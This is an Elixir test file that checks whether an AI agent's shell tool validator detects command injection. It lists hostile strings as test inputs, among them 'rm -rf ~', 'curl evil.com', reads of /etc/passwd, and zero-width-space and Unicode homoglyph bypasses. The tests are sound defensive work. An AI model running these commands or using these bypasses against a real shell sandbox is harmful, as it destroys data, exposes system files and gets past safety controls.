defmodule AI.Tools.Shell.CommandInjectionTest do
  use Fnord.TestCase, async: true
  alias AI.Tools.Shell.Util

  describe "command injection detection" do
    test "semicolon injection should be detected" do
      # Test the specific vulnerability mentioned in the security review
      injection_cmd = "ls /tmp; echo HACKED"
      
      assert Util.contains_disallowed_syntax?(injection_cmd) == true,
             "Command '#{injection_cmd}' should be detected as containing disallowed syntax"
    end

    test "safe commands should not be flagged" do
      safe_commands = [
        "ls -la",
        "cat file.txt",
        "grep pattern file.txt",
        "pwd"
      ]

      for cmd <- safe_commands do
        assert Util.contains_disallowed_syntax?(cmd) == false,
               "Safe command '#{cmd}' should not be flagged as dangerous"
      end
    end

    test "other injection patterns should be detected" do
      dangerous_commands = [
        "ls && echo HACKED",     # logical AND
        "ls || echo HACKED",     # logical OR  
        "ls | grep HACKED",      # pipe
        "ls > /tmp/hacked",      # redirect output
        "ls < /dev/null",        # redirect input
        "echo $(whoami)",        # command substitution
        "echo `whoami`",         # backtick substitution
      ]

      for cmd <- dangerous_commands do
        assert Util.contains_disallowed_syntax?(cmd) == true,
               "Dangerous command '#{cmd}' should be detected as containing disallowed syntax"
      end
    end

    test "stdin redirect bypass vulnerability should be detected" do
      # Test the specific vulnerability: commands that bypass stdin redirect detection
      # and allow injection after the < /dev/null gets appended
      bypass_cmd = "cat /etc/passwd < /dev/null; rm -rf ~"
      
      assert Util.contains_disallowed_syntax?(bypass_cmd) == true,
             "Command '#{bypass_cmd}' should be detected as containing disallowed syntax due to semicolon injection"
    end

    test "needs_stdin_redirect logic can be bypassed" do
      # Test edge case: commands that don't contain < or | but still have injection
      # These would get < /dev/null appended, but the semicolon allows command chaining
      
      # This command doesn't contain < or |, so needs_stdin_redirect? would return true
      # But it contains semicolon injection that would execute after < /dev/null is appended
      injection_without_redirect = "echo test; rm important_file"
      
      assert Util.contains_disallowed_syntax?(injection_without_redirect) == true,
             "Command '#{injection_without_redirect}' should be detected due to semicolon injection"
    end
  end

  describe "stdin redirect bypass scenarios" do
    # Note: we can't directly test needs_stdin_redirect?/1 since it's private,
    # but we can test the scenarios that would be affected by it
    
    test "commands without redirect operators would get stdin redirect appended" do
      # These commands don't contain < or |, so they would get < /dev/null appended
      # But they still contain injection that should be caught by syntax checking
      
      commands_needing_stdin_redirect = [
        "echo hello; rm file",           # semicolon injection, no redirect
        "cat file && echo done",         # logical AND, no redirect  
        "ls; curl evil.com",             # semicolon with network call
        "pwd; rm -rf /tmp/important",    # semicolon with destructive command
      ]
      
      for cmd <- commands_needing_stdin_redirect do
        # These should all be caught by disallowed syntax checking
        assert Util.contains_disallowed_syntax?(cmd) == true,
               "Command '#{cmd}' should be detected as dangerous despite not having redirect operators"
      end
    end
    
    test "commands with redirect operators would not get stdin redirect appended" do
      # These commands contain < or |, so they wouldn't get < /dev/null appended
      # They should still be caught as dangerous due to their operators
      
      commands_with_redirects = [
        "cat /etc/passwd < /dev/null; rm file",  # already has <, plus injection
        "ls | grep test; rm file",               # already has |, plus injection
        "echo test > output; rm file",           # already has >, plus injection
      ]
      
      for cmd <- commands_with_redirects do
        assert Util.contains_disallowed_syntax?(cmd) == true,
               "Command '#{cmd}' should be detected as dangerous due to multiple operators"
      end
    end
  end

  describe "operator detection bypass attempts" do
    test "zero-width space bypass should be detected" do
      # Test if zero-width spaces can be used to hide operators
      zwsp = <<0x200B::utf8>>
      
      bypass_attempts = [
        "ls#{zwsp}; rm file",           # zero-width space before semicolon
        "ls ;#{zwsp} rm file",          # zero-width space after semicolon  
        "ls#{zwsp}&&#{zwsp}rm file",    # zero-width spaces around &&
        "cat file#{zwsp}|#{zwsp}sh",    # zero-width spaces around pipe
      ]
      
      for cmd <- bypass_attempts do
        assert Util.contains_disallowed_syntax?(cmd) == true,
               "Command with zero-width space '#{inspect(cmd)}' should be detected as dangerous"
      end
    end

    test "unicode homoglyph bypass should be detected" do
      # These Unicode characters look identical to ASCII operators and should be detected as dangerous
      # If this test fails, it means the vulnerability exists
      
      homoglyph_attempts = [
        "ls ； rm file",        # fullwidth semicolon (U+FF1B) - should be detected
        "ls ｜ grep test",       # fullwidth vertical line (U+FF5C) - should be detected
        "ls ＆＆ echo test",     # fullwidth ampersands (U+FF06) - should be detected  
        "ls ＞ output",         # fullwidth greater than (U+FF1E) - should be detected
        "ls ＜ input",          # fullwidth less than (U+FF1C) - should be detected
      ]
      
      for cmd <- homoglyph_attempts do
        result = Util.contains_disallowed_syntax?(cmd)
        assert result == true,
               "Unicode homoglyph '#{cmd}' should be detected as dangerous (currently: #{result})"
      end
    end

    test "lesser known shell operators should be detected" do
      # Test some shell operators that might not be in the standard detection list
      advanced_operators = [
        "cmd <(echo test)",      # process substitution input
        "cmd >(cat > file)",     # process substitution output  
        "cmd &",                 # background process
        "cmd <<EOF\ntest\nEOF",  # here-document (should be caught by << detection)
      ]
      
      for cmd <- advanced_operators do
        result = Util.contains_disallowed_syntax?(cmd)
        
        # Most of these should be detected by existing patterns
        case cmd do
          "cmd &" -> 
            # Single & should be detected by (?<!\&)\&(?!\&) pattern
            assert result == true, "Single ampersand '#{cmd}' should be detected"
          "cmd <<EOF" <> _ ->
            # Here-document should be detected by << pattern  
            assert result == true, "Here-document '#{cmd}' should be detected"
          _ ->
            # Process substitution should be detected by <( or >( patterns
            assert result == true, "Process substitution '#{cmd}' should be detected"
        end
      end
    end
  end

  describe "allowlist bypass with shell expansion" do
    test "allowed commands with command substitution should be detected" do
      # VULNERABILITY TEST: Commands on the allowlist become unsafe with shell expansion
      # Even though 'cat' is allowed, command substitution makes it dangerous
      
      allowlist_bypass_attempts = [
        "cat $(echo /etc/passwd)",           # command substitution with allowed command
        "ls $(echo /; rm -rf /tmp)",         # command substitution with destructive payload
        "grep $(curl evil.com) file.txt",   # command substitution with network call
        "head `find / -name passwd`",        # backtick substitution with allowed command
        "pwd && rm -rf $(echo /tmp/test)",   # allowed command chained with destruction
      ]
      
      for cmd <- allowlist_bypass_attempts do
        result = Util.contains_disallowed_syntax?(cmd)
        assert result == true,
               "Allowlist bypass attempt '#{cmd}' should be detected as dangerous (result: #{result})"
      end
    end

    test "safe allowed commands should not be flagged" do
      # These are genuinely safe uses of allowed commands
      safe_allowed_commands = [
        "cat file.txt",
        "ls -la /tmp",
        "grep pattern logfile.txt", 
        "head -10 data.txt",
        "pwd",
      ]
      
      for cmd <- safe_allowed_commands do
        result = Util.contains_disallowed_syntax?(cmd)
        assert result == false,
               "Safe allowed command '#{cmd}' should not be flagged (result: #{result})"
      end
    end

    test "quoted shell operators behavior" do
      # Test how the current implementation handles operators inside quotes
      quoted_commands_with_operators = [
        "grep 'pattern; with semicolon' file.txt",
        "cat 'filename && with ands'",
        "head 'file | with pipe'",
      ]
      
      for cmd <- quoted_commands_with_operators do
        result = Util.contains_disallowed_syntax?(cmd)
        # The implementation might be sophisticated enough to parse quotes correctly
        # Let's document the actual behavior rather than assume
        if result do
          # Operators inside quotes are still flagged (overly cautious)
          assert result == true, "Command '#{cmd}' flagged as complex despite quoted operators"
        else
          # Operators inside quotes are properly ignored (sophisticated parsing)
          assert result == false, "Command '#{cmd}' correctly identified as safe with quoted operators"
        end
      end
    end
  end
end